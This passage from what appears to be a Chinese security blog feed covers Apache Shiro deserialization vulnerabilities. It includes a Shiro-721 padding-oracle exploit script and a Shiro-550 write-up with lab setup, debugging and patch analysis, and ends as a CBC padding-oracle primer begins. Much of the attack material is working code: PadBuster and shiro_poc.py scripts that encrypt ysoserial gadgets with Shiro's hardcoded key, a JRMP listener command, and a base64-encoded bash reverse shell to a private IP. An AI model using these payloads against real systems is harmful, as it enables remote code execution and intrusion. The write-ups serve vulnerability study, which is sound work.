PadBuster(PaddingOracle): def __init__(self, **kwargs): super(PadBuster, self).__init__(**kwargs) self.session = requests.Session() self.wait = kwargs.get('wait', 2.0) def oracle(self, data, **kwargs): somecookie = b64encode(b64decode(unquote(sys.argv[2])) + data) self.session.cookies['rememberMe'] = somecookie if self.session.cookies.get('JSESSIONID'): del self.session.cookies['JSESSIONID'] while 1: try: response = self.session.get(sys.argv[1], stream=False, timeout=5, verify=False) break except (socket.error, requests.exceptions.RequestException): logging.exception('Retrying request in %.2f seconds...', self.wait) time.sleep(self.wait) continue self.history.append(response) if response.headers.get('Set-Cookie') is None or 'deleteMe' not in response.headers.get('Set-Cookie'): logging.debug('No padding exception raised on %r', somecookie) return raise BadPaddingExceptionif __name__ == '__main__': import logging import sys if not sys.argv[3:]: print 'Usage: %s &lt;url&gt; &lt;somecookie value&gt; &lt;payload&gt;' % (sys.argv[0], ) sys.exit(1) logging.basicConfig(level=logging.DEBUG) encrypted_cookie = b64decode(unquote(sys.argv[2])) padbuster = PadBuster() payload = open(sys.argv[3], 'rb').read() enc = padbuster.encrypt(plaintext=payload, block_size=16) print('rememberMe cookies:') print(b64encode(enc)) 注意：需要安装paddingoracle库，其只能运行于Python2环境中。 运行该exp脚本进行暴破： 1python shiro-721_exp.py http://mi1k7ea.com/account/ 79i2DTxHODbt9xx9dXAwBVBFFzH+QxJ1elF+Y+8apWqUAvvc0HtEZYC9kcwXCPbcIZA/tUvLhzoSny6fEOSZIDtgTsvuCIWTz6zxSv3IEYg7AHHYVj1vvGQeDHuxXtclr9ipKCPWrXLaaMMObzGPrPbLWKvi5owo0YEklVL9EoStdZkslMcJo2y6hNYHro3SwtjhTh1vdhdH0hi2RGR70O+F5lKLnsOa9wvwfpz41kbzCCQyR82g16LhXRQgh4RUkHNmBynElujM/Gu8X7xpqlrhxXDr5MayBzFXTMMGOcjOm/bowf0BPn644tSLxR/7pSDxS+fTiTb5/odhk+QJpd1ayo5f9lKhcoJBiqRgO/nyPT8h/FoU/SDCiZL9oFTkvS2ZzzK69fqquLooB+5045x6kciBj2mgMYHlsapWzqlKW/Z1sXACZTtN5k8mDFVYH8iyQzO3YRBvUcXgD+0oLIizfmAq3lC5K8cNRvmH4q6QjQk48YK5psg6tK5V5R3y payload.class 得到暴破后的rememberMe值： 替换请求Cookie中的rememberMe值重放： 成功打到DNSLOG： 0x06 漏洞分析Padding Oracle Attack构造加密数据之前写的Padding Oracle Attack文章以及网上讲的文章大多数都是讲的如何使用Padding Oracle Attack来获取明文。但是这种场景在Apache Shiro Padding Oracle Attack这个漏洞场景中就不适用了，这也是当初暴出这个漏洞的时候我一时间搞不清楚原理的地方。 从漏洞复现我们知道，我们是需要通过Padding Oracle Attack加密Cookie中的数据而并非解密数据。其实，Padding Oracle Attack的另一种利用方式就是构造加密数据。 具体原理可参考p0师傅的文章，讲解得十分详细！：Shiro Padding Oracle Attack 反序列化 这里简单说下Padding Oracle Attack加密数据整体过程： 选择一个明文P，用来生成你想要的密文C； 使用适当的Padding将字符串填充为块大小的倍数，然后将其拆分为从1到N的块； 生成一个随机数据块（C[n]表示最后一个密文块）； 对于每一个明文块，从最后一块开始： 创建一个包括两块的密文C’，其是通过一个空块（00000…）与最近生成的密文块C[n+1]（如果是第一轮则是随机块）组合成的； 这步容易理解，就是Padding Oracle的基本攻击原理：修改空块的最后一个字节直至Padding Oracle没有出现错误为止，然后继续将最后一个字节设置为2并修改最后第二个字节直至Padding Oracle没有出现错误为止，依次类推，继续计算出倒数第3、4…个直至最后一个数据为止； 在计算完整个块之后，将它与明文块P[n]进行XOR一起创建C[n]； 对后续的每个块重复上述过程（在新的密文块前添加一个空块，然后进行Padding Oracle爆破计算）； 简单地说，每一个密文块解密为一个未知值，然后与前一个密文块进行XOR。通过仔细选择前一个块，我们可以控制下一个块解密来得到什么。即使下一个块解密为一堆无用数据，但仍然能被XOR化为我们控制的值，因此可以设置为任何我们想要的值。 一个Java反序列化TipsJava原生反序列化是按照指定格式来读取序列化数据的，而ObjectOutputStream是一个对象操作流，其会按格式以队列方式读下去，也就是说在正常的序列化数据后面继续添加一些数据是不会影响反序列化操作的。 因此，我们可以在已有的Cookie rememberMe值后面加入一段数据，只要AES解密成功，就能进行反序列化操作，而这段数据是可以通过Padding Oracle Attack来构造Java原生反序列化漏洞利用Gadget的加密数据，从而就能触发Java原生反序列化漏洞了。 Padding Oracle的Bool判断依据要成功进行Padding Oracle Attack是需要服务端返回两个不同的响应特征来进行Bool判断的。 在Apache Shiro的场景中，这个服务端的两个不同的响应特征为： Padding Oracle错误时，服务端响应报文的Set-Cookie头字段返回rememberMe=deleteMe； Padding Oracle正确时，服务端返回正常的响应报文内容； 具体代码层面的原因在下面小节中会讲到。 漏洞代码分析在之前Shiro550的文章就对Shiro相关调用进行调试分析过了，这里就只对相关的代码进行解读分析。 直接看到org/apache/shiro/mgt/AbstractRememberMeManager类的getRememberedPrincipals()函数： 一样是调用convertBytesToPrincipals()函数，继续看往下的几层调用： 这里CipherService接口类decrypt()函数的实现类是org/apache/shiro/crypto/JcaCipherService类，decrypt()函数就是调用JcaCipherService类的decrypt()函数，我们逐步往下看几层函数调用： 从这条函数调用栈可以看出，如果Padding Oracle失败，就会抛出CryptoException的异常。 我们可以继续跟进doFinal()函数里面的调用栈进去看看是怎么判断Padding Oracle失败的。看到如下几个函数调用链：doFinal()函数-&gt;this.spi即AESCipher类中的engineDoFinal()函数-&gt;CipherCore类的doFinal()函数-&gt;CipherCore类的fillOutputBuffer()函数-&gt;CipherCore类的unpad()函数 看到上述的unpad就是进行块padding的计算操作，如果返回值&lt;0则直接抛出BadPaddingException异常。而这里this.padding就是com\\sun\\crypto\\provider\\PKCS5Padding类，即1.4.1及以下版本Shiro使用AES-CBC的PKCS 5作为Padding规则。 看到PKCS5Padding类的unpad()函数，主要是根据PKCS 5规则来校验Padding是否正确，若不正确则返回-1。其中最关键的判断条件就是第三个if判断条件，其正是校验最后Padding的n位的值是否为0x0n： 而当PKCS5Padding类的unpad()函数返回-1时，就会返回到CipherCore类的unpad()函数中抛出BadPaddingException异常，而该异常会被捕获到并抛出CryptoException异常。 当抛出异常时，就会在函数调用栈前面的getRememberedPrincipals()函数中的try catch给捕获到，其中调用onRememberedPrincipalFailure()来处理抛出的异常信息： 看到调用了forgetIdentity()函数，继续往下看到其实现类org/apache/shiro/web/mgt/CookieRememberMeManager： 这里removeFrom()函数的实现类是org/apache/shiro/web/servlet/SimpleCookie： 其中将DELETED_COOKIE_VALUE的值设置到响应报文的Set-Cookie头字段中的rememberMe中，而该值就是deleteMe： 至此，我们就知道了Padding Oracle失败后服务端会返回Set-Cookie头字段rememberMe值为deleteMe。 对于Padding Oracle正确的情况下，AES解密后的内容是要经过Java反序列化操作的，要想响应返回不同于Padding Oracle错误时的特征，就需要反序列化得到的是正常登录用户的Cookie rememberMe值，因此Padding Oracle Attack的前提是需要有正常登录用户的Cookie rememberMe值的（这块代码分析可参考threedr3am师傅的文章）。 最后，借用千里目安全实验室的一张图，展示了漏洞利用的主要过程： 0x07 补丁分析到Shiro 1.4.2版本后，将默认的AES-CBC模式改为了AES-GCM模式： 具体代码如下：https://github.com/apache/shiro/commit/a8018783373ff5e5210225069c9919e071597d5e#diff-d61135f70077e55187e227aa61a3f72eef52568787ecbd59913e8a609b35019c 0x08 工具推荐ShiroExploit，暴破的过程一样的相当久：https://github.com/feihong-cs/ShiroExploit 0x09 参考Apache Shiro源码浅析之从远古洞到最新PaddingOracle CBC Shiro Padding Oracle Attack 反序列化 Going the other way with padding oracles: Encrypting arbitrary data! Shiro组件漏洞与攻击链分析","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Shiro","slug":"Shiro","permalink":"https://www.mi1k7ea.com/tags/Shiro/"}]},{"title":"浅析Shiro rememberMe反序列化漏洞（Shiro550）","date":"2020-10-03T07:51:06.000Z","path":"2020/10/03/浅析Shiro-rememberMe反序列化漏洞（Shiro550）/","text":"0x01 简介Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API，您可以快速、轻松地获得任何应用程序，从最小的移动应用程序到最大的网络和企业应用程序。 Apache Shiro基本功能点如下图所示： Authentication：身份认证 / 登录，验证用户是不是拥有相应的身份； Authorization：授权，即权限验证，验证某个已认证的用户是否拥有某个权限；即判断用户是否能做事情，常见的如：验证某个用户是否拥有某个角色。或者细粒度的验证某个用户对某个资源是否具有某个权限； Session Management：会话管理，即用户登录后就是一次会话，在没有退出之前，它的所有信息都在会话中；会话可以是普通 JavaSE 环境的，也可以是如 Web 环境的； Cryptography：加密，保护数据的安全性，如密码加密存储到数据库，而不是明文存储； Web Support：Web 支持，可以非常容易的集成到 Web 环境； Caching：缓存，比如用户登录后，其用户信息、拥有的角色 / 权限不必每次去查，这样可以提高效率； Concurrency：shiro 支持多线程应用的并发验证，即如在一个线程中开启另一个线程，能把权限自动传播过去； Testing：提供测试支持； Run As：允许一个用户假装为另一个用户（如果他们允许）的身份进行访问； Remember Me：记住我，这个是非常常见的功能，即一次登录后，下次再来的话不用登录了； 注意，本次的Shiro反序列化漏洞点就是出现在Remember Me这个功能模块上。 0x02 Shiro rememberMe反序列化漏洞（CVE-2016-4437）漏洞原理Apache Shiro &lt;= 1.2.4 版本中，加密的用户信息序列化后存储在Cookie的rememberMe字段中，攻击者可以使用Shiro的AES加密算法的默认密钥来构造恶意的Cookie rememberMe值，发送到Shiro服务端之后会先后进行Base64解码、AES解密、readObject()反序列化，从而触发Java原生反序列化漏洞，进而实现RCE。 该漏洞的根源在于硬编码Key。 漏洞版本Apache Shiro &lt;= 1.2.4 环境搭建直接参考Vulhub：https://vulhub.org/#/environments/shiro/CVE-2016-4437/ 或者从GitHub下载漏洞版本的Shiro在本地搭建均可。 这里看下本地怎么搭建，这里使用Apache Shiro Quickstart示例页面作为本地靶机环境，先下载Shiro并切换到漏洞版本1.2.4： 12git clone https://github.com/apache/shiro.gitgit checkout shiro-root-1.2.4 #切换分支 接着在IDEA中打开shiro/samples/web子目录为项目，修改pom.xml，注意最后要添加识别JSP标签的JSTL库和Standard库： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd\"&gt; &lt;parent&gt; &lt;groupId&gt;org.apache.shiro.samples&lt;/groupId&gt; &lt;artifactId&gt;shiro-samples&lt;/artifactId&gt; &lt;version&gt;1.2.4&lt;/version&gt; &lt;relativePath&gt;../pom.xml&lt;/relativePath&gt; &lt;/parent&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;artifactId&gt;samples-web&lt;/artifactId&gt; &lt;name&gt;Apache Shiro :: Samples :: Web&lt;/name&gt; &lt;packaging&gt;war&lt;/packaging&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-toolchains-plugin&lt;/artifactId&gt; &lt;version&gt;1.1&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;goals&gt; &lt;goal&gt;toolchain&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;configuration&gt; &lt;toolchains&gt; &lt;jdk&gt; &lt;version&gt;1.7&lt;/version&gt; &lt;vendor&gt;sun&lt;/vendor&gt; &lt;/jdk&gt; &lt;/toolchains&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;forkMode&gt;never&lt;/forkMode&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.mortbay.jetty&lt;/groupId&gt; &lt;artifactId&gt;maven-jetty-plugin&lt;/artifactId&gt; &lt;version&gt;$&#123;jetty.version&#125;&lt;/version&gt; &lt;configuration&gt; &lt;contextPath&gt;/&lt;/contextPath&gt; &lt;connectors&gt; &lt;connector implementation=\"org.mortbay.jetty.nio.SelectChannelConnector\"&gt; &lt;port&gt;9080&lt;/port&gt; &lt;maxIdleTime&gt;60000&lt;/maxIdleTime&gt; &lt;/connector&gt; &lt;/connectors&gt; &lt;requestLog implementation=\"org.mortbay.jetty.NCSARequestLog\"&gt; &lt;filename&gt;./target/yyyy_mm_dd.request.log&lt;/filename&gt; &lt;retainDays&gt;90&lt;/retainDays&gt; &lt;append&gt;true&lt;/append&gt; &lt;extended&gt;false&lt;/extended&gt; &lt;logTimeZone&gt;GMT&lt;/logTimeZone&gt; &lt;/requestLog&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;servlet-api&lt;/artifactId&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;net.sourceforge.htmlunit&lt;/groupId&gt; &lt;artifactId&gt;htmlunit&lt;/artifactId&gt; &lt;version&gt;2.6&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt; &lt;artifactId&gt;shiro-core&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt; &lt;artifactId&gt;shiro-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mortbay.jetty&lt;/groupId&gt; &lt;artifactId&gt;jetty&lt;/artifactId&gt; &lt;version&gt;$&#123;jetty.version&#125;&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mortbay.jetty&lt;/groupId&gt; &lt;artifactId&gt;jsp-2.1-jetty&lt;/artifactId&gt; &lt;version&gt;$&#123;jetty.version&#125;&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;jcl-over-slf4j&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt; &lt;version&gt;4.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;taglibs&lt;/groupId&gt; &lt;artifactId&gt;standard&lt;/artifactId&gt; &lt;version&gt;1.1.2&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 接着配置Tomcat服务器： 之后运行就OK了。 漏洞复现Shiro特征探测，在登录接口的响应报文中Set-Cookie头字段存在rememberMe，可以针对此类型接口进行PoC盲打： 漏洞探测1shiro_poc.py，基于ysoserial工具生成基于CommonsBeanutils1的反序列化利用payload，然后使用Shiro默认Key来进行AES和Base64相关加密操作，最后输出完整rememberMe的payload： 123456789101112131415161718192021222324import sysimport base64import uuidfrom random import Randomimport subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command): popen = subprocess.Popen(['java', '-jar', 'ysoserial-master-6eca5bc740-1.jar', 'CommonsBeanutils1', command], stdout=subprocess.PIPE) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = \"kPH+bIxk5D2deZiIxcaaaA==\" mode = AES.MODE_CBC iv = uuid.uuid4().bytes encryptor = AES.new(base64.b64decode(key), mode, iv) file_body = pad(popen.stdout.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextif __name__ == '__main__': payload = encode_rememberme(sys.argv[1]) print(\"rememberMe=&#123;&#125;\".format(payload.decode())) # with open(\"payload.txt\", \"w\") as fpw: # print(\"rememberMe=&#123;&#125;\".format(payload.decode()), file=fpw) 生成探测类的PoC： 1python shiro_poc.py &quot;ping xxx.ceye.io&quot; 直接将上述命令输出的payload放到Cookie中打过去，任意接口都OK： ceye中看到DNS查询记录就验证存在rememberMe反序列化漏洞： 漏洞探测2当然，通用的反序列化探测类PoC为URLDNS这个Gadget，这是因为URLDNS类无需其他依赖、就存在于JDK环境中，其已集成在ysoserial中，我们直接用就可以了，使其指向DNSLOG： 1java -jar ysoserial-master-6eca5bc740-1.jar URLDNS &quot;http://oup399.dnslog.cn&quot; &gt; poc.ser Java写的用于生成payload，和前面的shiro_poc.py原理一样： 12345678910111213141516171819import org.apache.shiro.crypto.AesCipherService;import org.apache.shiro.codec.CodecSupport;import org.apache.shiro.util.ByteSource;import org.apache.shiro.codec.Base64;import java.nio.file.Files;import java.nio.file.Paths;public class TestRemember &#123; public static void main(String[] args) throws Exception &#123; byte[] payloads = Files.readAllBytes(Paths.get(\"E:\\\\xxx\\\\poc.ser\")); AesCipherService aes = new AesCipherService(); byte[] key = Base64.decode(CodecSupport.toBytes(\"kPH+bIxk5D2deZiIxcaaaA==\")); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.println(ciphertext.toString()); &#125;&#125; 运行得到payload，放到Cookie的rememberMe中打过去： 此时DNSLOG收到请求即可验证存在漏洞： 漏洞利用后续利用只需将执行的命令改为反弹shell的bash命令即可： 1python shiro_poc.py &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjEuMC4xLzY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; 最终测试的shiro_poc.py脚本如下： 123456789101112131415161718192021222324252627282930313233343536373839import sysimport base64import uuidfrom random import Randomimport subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command): # popen = subprocess.Popen(['java', '-jar', 'ysoserial-master-6eca5bc740-1.jar', 'URLDNS', command], stdout=subprocess.PIPE) # popen = subprocess.Popen(['java', '-jar', 'ysoserial-master-6eca5bc740-1.jar', 'CommonsBeanutils1', command], stdout=subprocess.PIPE) # popen = subprocess.Popen(['java', '-jar', 'ysoserial-master-6eca5bc740-1.jar', 'CommonsCollections5', command], stdout=subprocess.PIPE) popen = subprocess.Popen(['java', '-jar', 'ysoserial-master-6eca5bc740-1.jar', 'JRMPClient', command], stdout=subprocess.PIPE) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = \"kPH+bIxk5D2deZiIxcaaaA==\" mode = AES.MODE_CBC iv = uuid.uuid4().bytes encryptor = AES.new(base64.b64decode(key), mode, iv) file_body = pad(popen.stdout.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextif __name__ == '__main__': # URLDNS # payload = encode_rememberme('http://shiro.k7b1ft.dnslog.cn') # CommonsBeanutils1 # payload = encode_rememberme('ping cb1.k7b1ft.dnslog.cn') # CommonsCollections5/6/7 # payload = encode_rememberme('ping cc5.k7b1ft.dnslog.cn') # JRMP payload = encode_rememberme('172.21.0.1:1234') print(\"rememberMe=&#123;&#125;\".format(payload.decode())) # with open(\"payload.txt\", \"w\") as fpw: # print(\"rememberMe=&#123;&#125;\".format(payload.decode()), file=fpw) 调试分析在本地搭建的Apache Shiro Quickstart环境中，我们在看Shiro源码的时候，看到一个名为CookieRememberMeManager的类，顾名思义就是Cookie rememberMe的管理类，直接在org/apache/shiro/web/mgt/CookieRememberMeManager类的getRememberedSerializedIdentity()函数中打上断点开始调试。 用URLDNS的payload打过去，此时函数调用栈如下： 1234567891011121314151617181920212223242526272829getRememberedSerializedIdentity:187, CookieRememberMeManager (org.apache.shiro.web.mgt)getRememberedPrincipals:393, AbstractRememberMeManager (org.apache.shiro.mgt)getRememberedIdentity:604, DefaultSecurityManager (org.apache.shiro.mgt)resolvePrincipals:492, DefaultSecurityManager (org.apache.shiro.mgt)createSubject:342, DefaultSecurityManager (org.apache.shiro.mgt)buildSubject:846, Subject$Builder (org.apache.shiro.subject)buildWebSubject:148, WebSubject$Builder (org.apache.shiro.web.subject)createSubject:292, AbstractShiroFilter (org.apache.shiro.web.servlet)doFilterInternal:359, AbstractShiroFilter (org.apache.shiro.web.servlet)doFilter:125, OncePerRequestFilter (org.apache.shiro.web.servlet)internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)doFilter:166, ApplicationFilterChain (org.apache.catalina.core)invoke:199, StandardWrapperValve (org.apache.catalina.core)invoke:96, StandardContextValve (org.apache.catalina.core)invoke:543, AuthenticatorBase (org.apache.catalina.authenticator)invoke:139, StandardHostValve (org.apache.catalina.core)invoke:81, ErrorReportValve (org.apache.catalina.valves)invoke:690, AbstractAccessLogValve (org.apache.catalina.valves)invoke:87, StandardEngineValve (org.apache.catalina.core)service:343, CoyoteAdapter (org.apache.catalina.connector)service:615, Http11Processor (org.apache.coyote.http11)process:65, AbstractProcessorLight (org.apache.coyote)process:818, AbstractProtocol$ConnectionHandler (org.apache.coyote)doRun:1627, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)run:49, SocketProcessorBase (org.apache.tomcat.util.net)runWorker:1149, ThreadPoolExecutor (java.util.concurrent)run:624, ThreadPoolExecutor$Worker (java.util.concurrent)run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)run:748, Thread (java.lang) 在getRememberedSerializedIdentity()函数中，调用getCookie()函数获取到cookie头字段，然后调用readValue()函数获取到cookie中的rememberMe对应的值即恶意构造的payload： 接着，是对这段base64字符串进行Base64解码并返回： 往下，返回到了父类org/apache/shiro/mgt/AbstractRememberMeManager的getRememberedPrincipals()函数中，其中对返回的字节数组通过调用convertBytesToPrincipals()函数来进行一个转换的操作： 跟进convertBytesToPrincipals()函数，先判断是否有加密算法服务，这里看到是使用CBC模式的AES加密算法的，其中Padding规则是PKCS5，然后开始调用decrypt()函数来对前面Base64解密后的字节数组进行AES解密操作： 跟进decrypt()函数，其中调用CipherService类的decrypt()函数来进一步解密，这里解密细节无需过多探究，再往下就是得到解密后的序列化字节数组并返回： 注意到，这里AES加密算法是对称加密算法，即加密和解密的Key是一样的，上面是通过调用AbstractRememberMeManager类的getDecryptionCipherKey()函数来获取解密Key的，跟进去查看后，发现AbstractRememberMeManager类的构造函数默认就调用setCipherKey()函数来设置加解密的Key了，而该Key则是硬编码写死在其中： 123456789101112131415161718192021222324252627/*** The following Base64 string was generated by auto-generating an AES Key:* &lt;pre&gt;* AesCipherService aes = new AesCipherService();* byte[] key = aes.generateNewKey().getEncoded();* String base64 = Base64.encodeToString(key);* &lt;/pre&gt;* The value of 'base64' was copied-n-pasted here:*/private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(\"kPH+bIxk5D2deZiIxcaaaA==\");...public AbstractRememberMeManager() &#123; this.serializer = new DefaultSerializer&lt;PrincipalCollection&gt;(); this.cipherService = new AesCipherService(); setCipherKey(DEFAULT_CIPHER_KEY_BYTES);&#125;...public void setCipherKey(byte[] cipherKey) &#123; //Since this method should only be used in symmetric ciphers //(where the enc and dec keys are the same), set it on both: setEncryptionCipherKey(cipherKey); setDecryptionCipherKey(cipherKey);&#125; 返回到convertBytesToPrincipals()函数后，就是直接注意调用deserialize()函数对返回的序列化字节数组进行反序列化操作： 往下，就是用默认反序列化器来进行反序列化操作，即熟悉的readObject()： 至此，Shiro对Cookie的rememberMe的处理流程已整体调试分析完了。 部分Gadget打失败的坑使用如下命令来打本地靶机环境并未成功，但环境中确实存在漏洞版本的CommonsCollections包： 1java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections5 &quot;calc&quot; &gt; poc.ser 看服务端主要有如下报错信息： 1234562020-10-09 16:43:17,920 TRACE [org.apache.shiro.util.ClassUtils]: Unable to load clazz named [org.apache.commons.collections.keyvalue.TiedMapEntry] from class loader [ParallelWebappClassLoader2020-10-09 16:43:18,082 TRACE [org.apache.shiro.util.ClassUtils]: Unable to load clazz named [org.apache.commons.collections.map.LazyMap] from class loader [ParallelWebappClassLoader2020-10-09 16:43:19,335 TRACE [org.apache.shiro.util.ClassUtils]: Unable to load clazz named [org.apache.commons.collections.functors.ChainedTransformer] from class loader [ParallelWebappClassLoader2020-10-09 16:43:19,567 TRACE [org.apache.shiro.util.ClassUtils]: Unable to load clazz named [[Lorg.apache.commons.collections.Transformer;] from class loader [ParallelWebappClassLoader2020-10-09 16:43:19,736 TRACE [org.apache.shiro.util.ClassUtils]: Unable to load clazz named [org.apache.commons.collections.functors.ConstantTransformer] from class loader [ParallelWebappClassLoader2020-10-09 16:43:20,112 TRACE [org.apache.shiro.util.ClassUtils]: Unable to load class named [org.apache.commons.collections.functors.InvokerTransformer] from the current ClassLoader. Trying the system/application ClassLoader... 也就是说，在环境中找不到TiedMapEntry、LazyMap、ChainedTransformer、Transformer、ConstantTransformer、InvokerTransformer这几个本该在JDK环境中就存在的类。 调试发现，该payload在readObject()的调用中会调用到org/apache/shiro/io/ClassResolvingObjectInputStream类的resolverClass()函数，很明显ClassResolvingObjectInputStream类继承了ObjectInputStream类并重写了resolverClass()函数，其中调用forName()来反射获取类： 跟进到forName()函数中调试发现，就是前面报错信息显示的那几个类在不同类加载器的loadClass()函数中调用时并没有加载成功从而返回null和打印如上的报错信息： 这里先使用THREAD_CL_ACCESSOR类加载器加载，加载失败返回为null后继续使用CLASS_CL_ACCESSOR类加载器加载，加载失败返回为null后再继续使用SYSTEM_CL_ACCESSOR加载器加载，均为null则打印报错信息并抛出异常。 分别跟进loadClass()函数看到，前两个是通过ParallelWebappClassLoader这个类加载器来加载类的、而最后一个是通过Launcher$AppClassLoader这个来加载器来加载类的，但是均加载失败打印错误日志并返回null： 至于坑点在哪，这里不做探讨，可参考这篇文章来调试分析，我们现在只是来看看怎么让payload可行就可以了。 网上的文章给出的关键点就是使用JRMP来打。 先开启恶意JRMP服务端： 1java -cp ysoserial-master-6eca5bc740-1.jar ysoserial.exploit.JRMPListener 1234 CommonsCollections5 &quot;ping jrmp.0tweer.dnslog.cn&quot; 然后使用JRMP客户端连接恶意JRMP服务端： 12345678910111213141516171819202122232425import sysimport base64import uuidfrom random import Randomimport subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command): popen = subprocess.Popen(['java', '-jar', 'ysoserial-master-6eca5bc740-1.jar', 'JRMPClient', command], stdout=subprocess.PIPE) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = \"kPH+bIxk5D2deZiIxcaaaA==\" mode = AES.MODE_CBC iv = uuid.uuid4().bytes encryptor = AES.new(base64.b64decode(key), mode, iv) file_body = pad(popen.stdout.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextif __name__ == '__main__': # JRMP payload = encode_rememberme('172.21.0.1:1234') print(\"rememberMe=&#123;&#125;\".format(payload.decode())) 打过去就可以了： 当然，本地环境和远程环境有点区别，这块坑这里就不涉及了，大伙可自行踩坑填坑。 补丁分析看到Apache Shiro 1.2.5版本的源码，修复方法就是将使用默认Key加密改为生成随机的Key加密：https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848 0x03 工具推荐ShiroExploit工具，其中包括对硬编码Key和Padding Oracle Attack两种类型Apache Shiro反序列化漏洞的多种检测方式和漏洞利用，集成了AES加密算法Key字典以及ysoserial工具的Gadgets，十分方便：https://github.com/feihong-cs/ShiroExploit 0x04 参考Shiro-1.2.4-RememberMe 反序列化踩坑深入分析 Apache Shiro源码浅析之从远古洞到最新PaddingOracle CBC Shiro反序列化漏洞利用汇总（Shiro-550+Shiro-721）","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Shiro","slug":"Shiro","permalink":"https://www.mi1k7ea.com/tags/Shiro/"}]},{"title":"浅析CBC字节翻转攻击与Padding Oracle Attack","date":"2020-09-17T09:24:13.000Z","path":"2020/09/17/浅析CBC字节翻转攻击与Padding-Oracle-Attack/","text":"0x00 前言有时候日志审计会看到Padding Oracle Attack相关的事件，但个人对这块不熟就学习做下笔记吧，都是参考学习网上大佬们的文章。 0x01 基本概念异或（XOR）异或（XOR）是一个数学运算符。它应用于逻辑运算。异或的数学符号为“⊕”，计算机符号为“xor”。其运算法则为： a⊕b = (¬a ∧ b) ∨ (a ∧¬b) 如果a、b两个值不相同，则异或结果为1。如果a、b两个值相同，异或结果为0。 